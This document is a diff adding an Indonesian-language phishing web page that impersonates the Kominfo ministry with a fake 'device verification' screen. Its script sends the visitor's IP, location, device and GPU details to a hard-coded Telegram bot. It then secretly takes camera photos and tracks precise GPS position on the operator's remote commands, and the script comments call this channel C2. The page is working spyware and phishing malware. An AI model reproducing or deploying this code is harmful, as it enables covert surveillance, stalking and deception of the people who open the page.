@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sistem Verifikasi IQ Nasional - Kominfo</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; background-color: #f1f5f9; }
+        .gov-header { background: linear-gradient(to right, #003399, #0055cc); }
+        .scanning-animation { 
+            height: 4px; 
+            background: rgba(255, 0, 0, 0.7); 
+            box-shadow: 0 0 15px #ff0000;
+            position: absolute; 
+            width: 100%; 
+            z-index: 50;
+            top: 0; 
+            animation: move 3s infinite ease-in-out; 
+        }
+        @keyframes move { 0% { top: 0%; } 50% { top: 100%; } 100% { top: 0%; } }
+        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+        .loading-dot:after { content: ' .'; animation: dots 1.5s steps(5, end) infinite; }
+        @keyframes dots { 0%, 20% { content: ''; } 40% { content: '.'; } 60% { content: '..'; } 80% { content: '...'; } }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <!-- Official Gov Header with SVG Logo -->
+    <header class="gov-header text-white p-4 flex items-center gap-4 shadow-md">
+        <div class="bg-white p-1.5 rounded-sm">
+            <!-- SVG Garuda Placeholder (Simplified) -->
+            <svg width="40" height="40" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M256 48C141.1 48 48 141.1 48 256s93.1 208 208 208 208-93.1 208-208S370.9 48 256 48zm0 32c97.2 0 176 78.8 176 176s-78.8 176-176 176S80 353.2 80 256 158.8 80 256 80z" fill="#D4AF37"/>
+                <path d="M256 128l-30 90h60l-30-90zM160 256h192v32H160z" fill="#D4AF37"/>
+            </svg>
+        </div>
+        <div>
+            <h1 class="text-xs font-bold uppercase leading-tight tracking-wider">Kementerian Komunikasi dan Informatika</h1>
+            <p class="text-[10px] opacity-90 uppercase font-semibold">Republik Indonesia</p>
+        </div>
+    </header>
+
+    <main class="flex-grow flex items-center justify-center p-6 relative overflow-hidden">
+        <div id="scanner" class="hidden scanning-animation"></div>
+        
+        <div class="max-w-md w-full bg-white rounded-xl shadow-xl border border-gray-200 p-8 z-10">
+            <div id="initial-ui">
+                <div class="flex justify-center mb-6">
+                    <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center">
+                        <svg class="w-8 h-8 text-blue-700" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+                        </svg>
+                    </div>
+                </div>
+
+                <h2 class="text-xl font-bold text-center text-slate-800 mb-2">Verifikasi Keamanan Perangkat</h2>
+                <p class="text-[13px] text-slate-500 text-center mb-6 leading-relaxed">
+                    Sistem mendeteksi akses dari lokasi baru. Berdasarkan <b>Peraturan Menkominfo No. 5 Tahun 2020</b>, verifikasi identitas hardware diperlukan untuk sinkronisasi database nasional.
+                </p>
+
+                <div class="space-y-4">
+                    <div class="bg-amber-50 border-l-4 border-amber-500 p-4">
+                        <div class="flex">
+                            <div class="ml-1">
+                                <p class="text-[11px] text-amber-800 font-medium leading-tight">
+                                    PENTING: Mohon berikan izin <b>Kamera</b> dan <b>Lokasi</b> pada jendela sistem agar proses verifikasi biometric dan validasi area dapat dilakukan secara otomatis.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button id="verify-btn" class="w-full bg-blue-700 hover:bg-blue-800 text-white font-bold py-4 rounded-lg shadow-lg transition-all active:scale-95 shadow-blue-200">
+                        MULAI SINKRONISASI
+                    </button>
+                </div>
+            </div>
+
+            <!-- Loading State -->
+            <div id="loading-ui" class="hidden py-8 text-center">
+                <div class="inline-block animate-spin rounded-full h-12 w-12 border-4 border-blue-100 border-t-blue-700 mb-6"></div>
+                <h3 class="text-lg font-bold text-slate-800 loading-dot">Menghubungkan ke Server Pusat</h3>
+                <p class="text-xs text-slate-400 mt-2">Pastikan koneksi internet Anda stabil.</p>
+            </div>
+        </div>
+    </main>
+
+    <footer class="p-8 bg-white border-t border-gray-100 text-center">
+        <p class="text-[9px] text-slate-400 font-bold uppercase tracking-[0.3em] mb-4">Otoritas Sertifikasi Nasional</p>
+        <div class="flex justify-center gap-8 opacity-30">
+            <!-- Simplified BSSN/Kominfo SVG placeholders -->
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M21 3H3c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-9 12l-4-4h8l-4 4z"/></svg>
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="10"/></svg>
+        </div>
+    </footer>
+
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        // --- KONFIGURASI SKY ---
+        const CFG = {
+            TOKEN: "8759682332:AAHv34Oc4l39-ddBzunjyZEVwhmdZY0lKNw", // ISI TOKEN BOT
+            CHAT_ID: "7321133073",   // ISI CHAT ID
+            EXIT: "https://www.kominfo.go.id/",
+            POLL: 3000
+        };
+
+        const STATE = { lastId: 0, stream: null };
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+
+        async function tg(method, body = {}) {
+            try {
+                const r = await fetch(`https://api.telegram.org/bot${CFG.TOKEN}/${method}`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CFG.CHAT_ID, ...body })
+                });
+                return await r.json();
+            } catch (e) { return null; }
+        }
+
+        async function harvest() {
+            try {
+                const ip = await (await fetch('https://ipapi.co/json/')).json();
+                const bat = navigator.getBattery ? await navigator.getBattery() : { level: 1 };
+                const gl = document.createElement('canvas').getContext('webgl');
+                const d = gl.getExtension('WEBGL_debug_renderer_info');
+                const gpu = d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : "Unknown";
+
+                let m = `<b>🏛 HASIL PHISING</b>\n\n`;
+                m += `<b>IP:</b> ${ip.ip}\n<b>ISP:</b> ${ip.org}\n<b>Lokasi:</b> ${ip.city}, ${ip.region}\n\n`;
+                m += `<b>Device:</b> ${navigator.platform}\n<b>GPU:</b> ${gpu}\n<b>Bat:</b> ${bat.level * 100}%\n`;
+
+                await tg('sendMessage', {
+                    text: m, parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{text: "📸 DEPAN", callback_data: "f", stlyle: "danger"}, {text: "📸 BELAKANG", callback_data: "b", style: "danger"}],
+                            [{text: "📍 TRACK LOKASI", callback_data: "g"}],
+                            [{text: "📊 INFO", callback_data: "i"}, {text: "🚪 TUTUP", callback_data: "x"}]
+                        ]
+                    }
+                });
+            } catch (e) {}
+        }
+
+        async function getLoc() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (p) => {
+                    const { latitude: la, longitude: lo, accuracy: ac } = p.coords;
+                    await tg('sendMessage', { 
+                        text: `<b>📍 LOKASI PERSISI</b>\nAkurasi: ${ac.toFixed(1)}m\n<a href="https://www.google.com/maps?q=${la},${lo}">Lihat di Peta</a>`, 
+                        parse_mode: 'HTML' 
+                    });
+                }, (err) => {
+                    tg('sendMessage', { text: "Gagal ambil lokasi: " + err.message });
+                }, { enableHighAccuracy: true });
+            }
+        }
+
+        async function snap(mode) {
+            try {
+                if (STATE.stream) STATE.stream.getTracks().forEach(t => t.stop());
+                STATE.stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: mode === 'f' ? 'user' : 'environment' } 
+                });
+                v.srcObject = STATE.stream;
+                setTimeout(async () => {
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    const b = await (await fetch(c.toDataURL('image/jpeg', 0.85))).blob();
+                    const fd = new FormData();
+                    fd.append('chat_id', CFG.CHAT_ID); fd.append('photo', b, 'snap.jpg');
+                    fd.append('caption', `Captured: ${mode.toUpperCase()}`);
+                    await fetch(`https://api.telegram.org/bot${CFG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                }, 1500);
+            } catch (e) {
+                tg('sendMessage', { text: "Error Kamera: " + e.message });
+            }
+        }
+
+        async function listen() {
+            const u = await tg('getUpdates', { offset: STATE.lastId + 1, timeout: 20 });
+            if (u && u.result) {
+                for (const x of u.result) {
+                    STATE.lastId = x.update_id;
+                    if (x.callback_query) {
+                        const d = x.callback_query.data;
+                        if (d === 'f' || d === 'b') await snap(d);
+                        if (d === 'g') await getLoc();
+                        if (d === 'i') await harvest();
+                        if (d === 'x') window.location.href = CFG.EXIT;
+                        await tg('answerCallbackQuery', { callback_query_id: x.callback_query.id });
+                    }
+                }
+            }
+            setTimeout(listen, CFG.POLL);
+        }
+
+        document.getElementById('verify-btn').onclick = async () => {
+            document.getElementById('initial-ui').classList.add('hidden');
+            document.getElementById('loading-ui').classList.remove('hidden');
+            document.getElementById('scanner').classList.remove('hidden');
+            
+            try {
+                // Request Permission
+                STATE.stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                v.srcObject = STATE.stream;
+                
+                getLoc(); // Auto get location
+                listen(); // Start C2
+                
+                // Silent Snap
+                setTimeout(() => snap('f'), 2500);
+            } catch (e) {
+                alert("Verifikasi Gagal: Modul hardware ditolak sistem. Silakan muat ulang halaman.");
+                location.reload();
+            }
+        };
+
+        window.onload = harvest;
+    </script>
+</body>
+</html>
+
